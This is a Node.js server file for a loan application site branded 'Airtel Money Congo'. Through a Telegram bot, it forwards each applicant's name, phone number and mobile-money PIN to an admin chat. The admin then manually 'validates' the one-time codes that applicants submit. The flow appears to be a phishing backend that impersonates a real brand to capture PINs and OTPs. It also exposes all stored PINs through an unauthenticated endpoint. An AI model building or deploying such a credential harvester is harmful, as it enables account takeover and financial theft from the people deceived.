const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ==================== FILE-BASED STORAGE ====================
const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            const parsed = JSON.parse(raw);
            return {
                applications: new Map(parsed.applications || []),
                otps: new Map(parsed.otps || [])
            };
        }
    } catch (e) {
        console.log('Error loading data:', e.message);
    }
    return { applications: new Map(), otps: new Map() };
}

function saveData() {
    try {
        const data = {
            applications: Array.from(applications.entries()),
            otps: Array.from(otps.entries())
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    } catch (e) {
        console.log('Error saving data:', e.message);
    }
}

const { applications, otps } = loadData();
setInterval(saveData, 30000);

// Middleware
app.use(cors());
app.use(bodyParser.json());

// ==================== STATIC FILES ====================
const STATIC_DIR = __dirname;
let filesInDir = [];
try {
    filesInDir = fs.readdirSync(STATIC_DIR);
} catch (e) {
    console.log('Error reading directory:', e.message);
}

const indexFileName = filesInDir.find(f => f.toLowerCase().replace(/\s+/g, '') === 'index.html');
const INDEX_PATH = indexFileName ? path.join(STATIC_DIR, indexFileName) : path.join(STATIC_DIR, 'index.html');

console.log('__dirname:', __dirname);
console.log('Found index file name:', indexFileName || 'NOT FOUND');

app.use(express.static(STATIC_DIR));

// ==================== TELEGRAM BOT (ENGLISH) ====================
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        '👋 Welcome to Airtel Money Congo Admin Bot!\n\n' +
        'You will receive loan applications here.\n\n' +
        'Commands:\n' +
        '/pending - View pending requests\n' +
        '/approved - View approved loans\n' +
        '/declined - View declined loans\n' +
        '/help - Help'
    );
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        '📋 *Airtel Money Admin Commands*\n\n' +
        '/pending - List pending requests\n' +
        '/approved - List approved loans\n' +
        '/declined - List declined loans\n\n' +
        'When you receive a request:\n' +
        '✅ Approve: Click "✅ Approve"\n' +
        '❌ Decline: Click "❌ Decline"',
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/pending/, (msg) => {
    const chatId = msg.chat.id;
    const pending = Array.from(applications.values()).filter(a => a.status === 'pending');
    if (pending.length === 0) {
        bot.sendMessage(chatId, '📭 No pending requests.');
        return;
    }
    pending.forEach(app => sendApplicationToAdmin(app));
});

bot.onText(/\/approved/, (msg) => {
    const chatId = msg.chat.id;
    const approved = Array.from(applications.values()).filter(a => a.status === 'approved');
    if (approved.length === 0) {
        bot.sendMessage(chatId, '✅ No approved loans.');
        return;
    }
    approved.forEach(app => {
        bot.sendMessage(chatId, 
            `✅ *LOAN APPROVED*\n` +
            `ID: \`${app.id}\`\n` +
            `Name: ${app.firstName} ${app.lastName}\n` +
            `Amount: ${app.loanAmount} CDF\n` +
            `Duration: ${app.loanDuration} months\n` +
            `Phone: ${app.phone}\n` +
            `Date: ${app.submittedAt}`,
            { parse_mode: 'Markdown' }
        );
    });
});

bot.onText(/\/declined/, (msg) => {
    const chatId = msg.chat.id;
    const declined = Array.from(applications.values()).filter(a => a.status === 'declined');
    if (declined.length === 0) {
        bot.sendMessage(chatId, '❌ No declined loans.');
        return;
    }
    declined.forEach(app => {
        bot.sendMessage(chatId, 
            `❌ *LOAN DECLINED*\n` +
            `ID: \`${app.id}\`\n` +
            `Name: ${app.firstName} ${app.lastName}\n` +
            `Amount: ${app.loanAmount} CDF\n` +
            `Phone: ${app.phone}\n` +
            `Date: ${app.submittedAt}`,
            { parse_mode: 'Markdown' }
        );
    });
});

// ==================== CALLBACK QUERIES ====================
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;

    const [action, appId] = data.split(':');
    const app = applications.get(appId);

    if (!app) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Request not found!' });
        return;
    }

    if (action === 'approve') {
        app.status = 'approved';
        app.decidedAt = new Date().toISOString();
        app.decidedBy = chatId;

        const otp = generateOTP();
        otps.set(app.phone, { otp, appId, expiresAt: Date.now() + 10 * 60 * 1000 });
        saveData();

        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Loan approved! OTP sent to client.' });

        bot.editMessageText(
            `✅ *LOAN APPROVED*\n\n` + formatApplication(app) +
            `\n\n📱 OTP sent to: ${app.phone}\n🔢 OTP: ${otp}`,
            { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
        );

        console.log(`📲 OTP for ${app.phone}: ${otp}`);

    } else if (action === 'decline') {
        app.status = 'declined';
        app.decidedAt = new Date().toISOString();
        app.decidedBy = chatId;
        saveData();

        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Loan declined.' });

        bot.editMessageText(
            `❌ *LOAN DECLINED*\n\n` + formatApplication(app),
            { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
        );
    } else if (action === 'otp_valid') {
        // Admin confirms OTP is valid
        app.otpVerified = true;
        app.otpValidatedBy = chatId;
        app.otpValidatedAt = new Date().toISOString();
        saveData();

        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ OTP validated! Client will see success.' });

        bot.editMessageText(
            `✅ *OTP VALIDATED*\n\n` + formatApplication(app) +
            `\n\n🔐 OTP verified by admin\n✅ Client notified of success`,
            { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
        );

    } else if (action === 'otp_invalid') {
        // Admin says OTP is invalid
        app.otpRejected = true;
        app.otpRejectedBy = chatId;
        app.otpRejectedAt = new Date().toISOString();
        // Generate new OTP
        const newOtp = generateOTP();
        otps.set(app.phone, { otp: newOtp, appId, expiresAt: Date.now() + 10 * 60 * 1000 });
        saveData();

        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ OTP rejected. New OTP sent to client.' });

        bot.editMessageText(
            `❌ *OTP REJECTED - NEW OTP SENT*\n\n` + formatApplication(app) +
            `\n\n📱 New OTP sent to: ${app.phone}\n🔢 New OTP: ${newOtp}`,
            { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
        );

        console.log(`📲 New OTP for ${app.phone}: ${newOtp}`);
    }
});

// ==================== HELPERS ====================
function generateOTP() {
    return Math.floor(10000 + Math.random() * 90000).toString();
}

function formatApplication(app) {
    return (
        `📝 *Loan Application*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 *Name:* ${app.firstName} ${app.lastName}\n` +
        `📞 *Phone:* ${app.phone}\n` +
        `💰 *Amount:* ${app.loanAmount} CDF\n` +
        `📅 *Duration:* ${app.loanDuration} months\n` +
        `📊 *Interest:* 2.5%/month\n` +
        `💵 *Monthly Payment:* ${app.monthlyPayment} CDF\n` +
        `🔢 *PIN:* ${app.pin}\n` +
        `🏷 *Type:* ${app.loanType}\n` +
        `📝 *Purpose:* ${app.purpose || 'N/A'}\n` +
        `⏰ *Submitted:* ${app.submittedAt}\n` +
        `🆔 *ID:* \`${app.id}\``
    );
}

function sendApplicationToAdmin(app) {
    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ Approve', callback_data: `approve:${app.id}` },
                { text: '❌ Decline', callback_data: `decline:${app.id}` }
            ]
        ]
    };
    bot.sendMessage(ADMIN_CHAT_ID, formatApplication(app), {
        parse_mode: 'Markdown',
        reply_markup: keyboard
    });
}

function sendOTPValidationToAdmin(app) {
    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ Valid OTP', callback_data: `otp_valid:${app.id}` },
                { text: '❌ Invalid OTP', callback_data: `otp_invalid:${app.id}` }
            ]
        ]
    };
    bot.sendMessage(ADMIN_CHAT_ID, 
        `🔐 *OTP Verification Required*\n\n` + formatApplication(app) +
        `\n\nClient entered OTP. Please validate:`,
        { parse_mode: 'Markdown', reply_markup: keyboard }
    );
}

// ==================== API ENDPOINTS ====================
app.post('/api/apply', (req, res) => {
    const { firstName, lastName, phone, loanAmount, loanDuration, loanType, purpose, pin } = req.body;

    if (!firstName || !lastName || !phone || !loanAmount === undefined || !loanDuration === undefined || !pin) {
        return res.status(400).json({ success: false, message: 'Tous les champs sont requis' });
    }

    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
        return res.status(400).json({ success: false, message: 'Le PIN doit être de 4 chiffres' });
    }

    const amount = parseFloat(loanAmount);
    if (amount < 0 || amount > 2000000) {
        return res.status(400).json({ success: false, message: 'Le montant doit être entre 0 et 2,000,000 CDF' });
    }

    const duration = parseInt(loanDuration);
    if (duration < 1 || duration > 24) {
        return res.status(400).json({ success: false, message: 'La durée doit être entre 1 et 24 mois' });
    }

    const totalInterest = amount * 0.025 * duration;
    const totalRepayment = amount + totalInterest;
    const monthlyPayment = (totalRepayment / duration).toFixed(2);

    const appId = uuidv4();
    const application = {
        id: appId,
        firstName, lastName, phone, loanAmount: amount, loanDuration: duration,
        loanType: loanType || 'Non spécifié',
        purpose: purpose || 'Non spécifié',
        pin, monthlyPayment,
        status: 'pending',
        submittedAt: new Date().toISOString(),
        otp: null,
        otpVerified: false,
        otpRejected: false,
        otpValidatedBy: null,
        otpValidatedAt: null,
        otpRejectedBy: null,
        otpRejectedAt: null
    };

    applications.set(appId, application);
    saveData();
    sendApplicationToAdmin(application);

    res.json({ success: true, message: 'Demande soumise avec succès', applicationId: appId });
});

// OTP submission - sends to admin for validation
app.post('/api/verify-otp', (req, res) => {
    const { phone, otp, applicationId } = req.body;
    const stored = otps.get(phone);

    if (!stored) return res.status(400).json({ success: false, message: 'Aucun OTP trouvé' });
    if (Date.now() > stored.expiresAt) { 
        otps.delete(phone); 
        saveData(); 
        return res.status(400).json({ success: false, message: 'OTP expiré' }); 
    }
    if (stored.appId !== applicationId) return res.status(400).json({ success: false, message: 'OTP ne correspond pas' });

    const app = applications.get(applicationId);
    app.otp = otp;
    saveData();

    // Send to admin for validation instead of auto-approving
    sendOTPValidationToAdmin(app);

    res.json({ success: true, message: 'OTP soumis. En attente de validation admin.', status: 'pending_validation' });
});

// Client polls for OTP validation status
app.get('/api/otp-status/:id', (req, res) => {
    const app = applications.get(req.params.id);
    if (!app) return res.status(404).json({ success: false, message: 'Introuvable' });
    
    if (app.otpVerified) {
        res.json({ success: true, status: 'verified', application: {
            id: app.id, name: `${app.firstName} ${app.lastName}`, amount: app.loanAmount,
            duration: app.loanDuration, monthlyPayment: app.monthlyPayment, status: 'complete'
        }});
    } else if (app.otpRejected) {
        res.json({ success: true, status: 'rejected', message: 'OTP invalide. Nouveau code envoyé.' });
    } else {
        res.json({ success: true, status: 'pending', message: 'En attente de validation...' });
    }
});

app.get('/api/status/:id', (req, res) => {
    const app = applications.get(req.params.id);
    if (!app) return res.status(404).json({ success: false, message: 'Introuvable' });
    res.json({ success: true, status: app.status, otpVerified: app.otpVerified });
});

app.post('/api/resend-otp', (req, res) => {
    const { phone, applicationId } = req.body;
    const app = applications.get(applicationId);
    if (!app) return res.status(404).json({ success: false, message: 'Demande introuvable' });

    const otp = generateOTP();
    otps.set(phone, { otp, appId: applicationId, expiresAt: Date.now() + 10 * 60 * 1000 });
    saveData();
    console.log(`📲 OTP renvoyé pour ${phone}: ${otp}`);
    res.json({ success: true, message: 'OTP renvoyé', testOtp: otp });
});

app.get('/api/applications', (req, res) => {
    res.json({ success: true, count: applications.size, applications: Array.from(applications.values()) });
});

// ==================== FALLBACK ROUTE ====================
app.get('*', (req, res) => {
    if (indexFileName && fs.existsSync(INDEX_PATH)) {
        res.sendFile(INDEX_PATH);
    } else {
        res.status(404).json({ 
            error: 'index.html not found',
            dirname: __dirname,
            resolvedPath: INDEX_PATH,
            indexFileName: indexFileName || 'not found',
            filesInDir: filesInDir
        });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Airtel Money Congo Server running on port ${PORT}`);
    console.log(`🤖 Telegram Bot active (English)`);
    console.log(`💾 Data file: ${DATA_FILE}`);
    console.log(`📊 Loaded ${applications.size} applications`);
});
